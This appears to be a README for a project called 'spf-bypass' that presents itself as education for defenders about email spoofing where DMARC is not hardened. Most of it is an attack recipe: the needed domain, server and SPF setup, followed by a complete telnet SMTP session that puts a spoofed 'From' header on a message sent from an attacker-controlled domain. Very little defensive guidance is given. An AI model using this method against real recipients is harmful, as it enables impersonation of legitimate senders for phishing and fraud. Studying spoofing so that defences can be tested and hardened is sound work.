# spf-bypass
PLEASE NOTE THIS PROJECT WILL BE SUBJECT TO FREQUENT CHANGES

This project is meant to educate defenders and demonstrate the ease at which threat actors can abuse insecure domains for the delivery of spoofed email.
Utilising a security deficiency known as SPF-bypass, threat actors can deliver emails which provide no indication of malicious intent and can fool the most experienced Security professionals.

Please see https://dmarc.org/wiki/FAQ for a detailed overview of email authentication protocols (i.e. SPF, DKIM and DMARC).
Please see below for a detailed overview of how professionnal spammers bypass SPF where DMARC hasn't been setup in a hardened configuration.

Prerequisites to successfully deliver spoofed mail (utilising SPF-bypass techniques):
1. A domain you control (approx. cost $12-15 AUD/yr - see https://au.godaddy.com/)
2. A Server or VPN with a dedicated public IP that hasn't blocked outbound traffic over port 25 (approx. $80-150 AUD/yr)
3. Configure the DNS TXT Zone file for the purchased domain, to include the Server or VPN public IP in its public SPF record (see https://au.godaddy.com/help/add-an-spf-record-19218)

Upon completion of the above 3 steps, you'll be able to successfully demonstrate the delivery of spoofed mail utilising SPF-bypass techniques

To perform an SPF-bypass attack, simply run the below telnet commands that can be executed on any Windows or Linux endpoint. Replace <target.mailserver.com> with the target mail server you're delivering the spoofed email to (i.e. the recipient - lookup the MX record of the recipient domain to identify this), replace <attacker@attackerdomain.com> with the domain you procured and setup earlier, replace <Legitimate_Sender@spoofed.com> with the address and domain you're spoofing and replace <target@target.com.au> with your target recipient.

    telnet target.mailserver.com 25
    helo attackerdomain.com
    mail from: attacker@attackerdomain.com
    rcpt to: target@target.com.au
    data
    from: "Sender, Legitimate" <Legitimate_Sender@spoofed.com>
    to: target@target.com.au
    subject: Presentation - Email Demo
    This is a test

    .
